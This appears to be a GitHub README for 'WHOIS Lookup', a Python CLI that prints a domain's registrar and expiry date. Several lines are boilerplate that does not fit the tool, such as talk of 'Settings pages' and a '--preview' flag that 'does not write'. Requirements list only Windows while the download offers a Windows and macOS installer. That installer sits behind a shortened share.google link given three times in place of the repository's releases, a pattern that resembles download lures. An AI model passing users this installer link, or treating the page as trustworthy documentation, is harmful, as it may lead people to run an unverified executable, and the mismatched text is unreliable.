![WHOIS Lookup](assets/hero.png)

# WHOIS Lookup

*A short WHOIS, not a full dump page.*

## What WHOIS Lookup is

**WHOIS Lookup** is a network utility. Query WHOIS for a domain and print registrar and expiry if present.

You need registrar and expiry, not a 200-line blob.

Use it when you want the change on this machine without opening a dozen Settings pages.

## Editions

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Features

- Domain
- Registrar and expiry
- Prints raw optional
- Timeout

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/philiphall189/whois-lookup

MIT license. See `LICENSE`.
